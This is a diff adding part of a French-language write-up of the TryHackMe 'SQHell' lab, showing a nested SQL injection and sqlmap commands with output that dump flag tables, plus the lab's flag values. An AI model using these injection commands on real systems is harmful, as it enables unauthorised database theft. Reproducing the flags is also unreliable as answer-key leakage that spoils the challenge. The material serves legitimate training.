@@ -95,3 +95,69 @@ Table: flag
 Sqlmap extrait le flag sur l'injection sql faite sur l'utilisateur et extrait le flag.   
 Le flag est : THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308}   
 
+**Flag 4**
+
+![page](./Task1-06.png)  
+![page](./Task1-07.png)  
+
+Ici on injection sql imbriquée.   
+Le flag est : THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}   
+
+**Flag5**   
+
+![page](./Task1-08.png) 
+![page](./Task1-09.png)  
+
+Ici on récupère un requête sur les posts sur le paramètre id, on récupère la requête avec Burp.    
+
+```bash
+tim@kali:~/Bureau/tryhackme/write-up$ sqlmap -r view.req --dbms mysql -D sqhell_5 -T flag --dump
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.5.10#stable}
+|_ -| . [(]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:49:46 /2021-10-30/
+
+[20:49:46] [INFO] parsing HTTP request from 'view.req'
+[20:49:46] [WARNING] it appears that you have provided tainted parameter values ('id=-1 union select 1,2,user(),4') with most likely leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properly
+
+
+[*] ending @ 20:49:49 /2021-10-30/
+
+tim@kali:~/Bureau/tryhackme/write-up$ sqlmap -r view.req --dbms mysql -D sqhell_5 -T flag --dump
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.5.10#stable}
+|_ -| . [']     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:49:51 /2021-10-30/
+
+[20:49:51] [INFO] parsing HTTP request from 'view.req'
+[20:49:51] [WARNING] it appears that you have provided tainted parameter values ('id=-1 union select 1,2,user(),4') with most likely leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properly
+are you really sure that you want to continue (sqlmap could have problems)? [y/N] Y
+[20:49:52] [INFO] testing connection to the target URL
+...
+[20:50:29] [INFO] fetching entries for table 'flag' in database 'sqhell_5'
+Database: sqhell_5
+Table: flag
+[1 entry]
++----+---------------------------------------------+
+| id | flag                                        |
++----+---------------------------------------------+
+| 1  | THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8} |
++----+---------------------------------------------+
+...
+```
+
+On sqlmap on trouve le dernier flag qui est : THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8}    
+
+  
